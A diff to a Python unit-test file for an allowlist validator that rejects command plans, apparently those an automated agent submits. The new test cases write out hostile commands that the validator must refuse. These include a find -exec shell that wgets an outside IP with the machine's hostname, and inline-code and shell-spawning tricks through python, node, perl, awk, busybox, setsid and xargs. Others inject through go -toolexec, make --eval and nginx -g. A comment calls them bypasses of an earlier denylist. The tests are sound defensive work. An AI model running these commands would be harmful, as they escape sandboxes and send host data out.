@@ -100,8 +100,20 @@ class Reject(unittest.TestCase):
         ("git", plan_with(commands=[["git", "push"]]), "not allowed"),
         ("absolute program", plan_with(commands=[["/usr/bin/go", "build"]]), "not a path"),
         ("relative script", plan_with(commands=[["./run.sh"]]), "not a path"),
-        ("python -c", plan_with(commands=[["python3", "-c", "import os"]]), "inline code"),
-        ("node -e", plan_with(commands=[["node", "-e", "1"]]), "inline code"),
+        ("python -c", plan_with(commands=[["python3", "-c", "import os"]]), "not allowed"),
+        ("node -e", plan_with(commands=[["node", "-e", "1"]]), "not allowed"),
+        ("go without a subcommand", plan_with(commands=[["go"]]), "subcommand"),
+        ("go run", plan_with(commands=[["go", "run", "./cmd/exfil"]]), "subcommand"),
+        ("go generate", plan_with(commands=[["go", "generate", "./..."]]), "subcommand"),
+        ("go -toolexec", plan_with(commands=[["go", "build", "-toolexec=sh -c id", "./..."]]), "argument"),
+        ("go test -exec", plan_with(commands=[["go", "test", "-exec", "sh", "./..."]]), "argument"),
+        ("go -ldflags", plan_with(commands=[["go", "build", "-ldflags=-X main.v=1", "./..."]]), "argument"),
+        ("make --eval", plan_with(commands=[["make", "--eval=x:;@id", "x"]]), "argument"),
+        ("make variable override", plan_with(commands=[["make", "SHELL=/bin/sh", "test"]]), "argument"),
+        ("make -f", plan_with(commands=[["make", "-f", "Makefile.planted", "all"]]), "argument"),
+        ("make -C", plan_with(commands=[["make", "-C", "/", "test"]]), "argument"),
+        ("nginx -g", plan_with(commands=[["nginx", "-g", "load_module x.so;", "-t"]]), "argument"),
+        ("nginx relative config", plan_with(commands=[["nginx", "-t", "-c", "nginx.conf"]]), "argument"),
         ("empty argv", plan_with(commands=[[]]), "non-empty list"),
         ("non-string arg", plan_with(commands=[["make", 1]]), "non-empty list"),
         ("absolute edit", plan_with(edits=[{"path": "/etc/hosts", "why": "x"}]), "absolute path"),
@@ -123,6 +135,22 @@ class Reject(unittest.TestCase):
                 with self.assertRaises(PlanError) as cm:
                     compile_allowlist(plan)
                 self.assertIn(message, str(cm.exception))
+
+    def test_bypasses_found_in_review(self):
+        # Each of these ran a shell, inline code or a network client while a denylist was in place.
+        bypasses = [
+            ["find", ".", "-exec", "sh", "-c", "wget -qO- http://203.0.113.7/$(cat /etc/hostname)", ";"],
+            ["python3", "-Ic", "import socket"], ["python3", "-cimport socket"], ["python3.12", "-c", "1"],
+            ["python3", "-m", "http.server", "8000"], ["node", "--eval", "1"], ["node", "-p", "1"],
+            ["perl", "-E", "say 1"], ["perl", "-le", "print 1"], ["busybox", "sh", "-c", "id"],
+            ["busybox", "wget", "http://203.0.113.7/"], ["timeout", "100", "sh", "-c", "id"],
+            ["nice", "bash", "-c", "id"], ["setsid", "sh", "-c", "id"], ["awk", 'BEGIN{system("id")}'],
+            ["openssl", "s_client", "-connect", "203.0.113.7:443"], ["apk", "add", "curl"],
+            ["pip", "install", "requests"], ["php", "-r", "echo 1;"], ["npx", "x"], ["xargs", "sh"],
+        ]
+        for argv in bypasses:
+            with self.subTest(argv=argv), self.assertRaises(PlanError):
+                compile_allowlist(plan_with(commands=[argv]))
 
     def test_not_an_object(self):
         with self.assertRaises(PlanError):
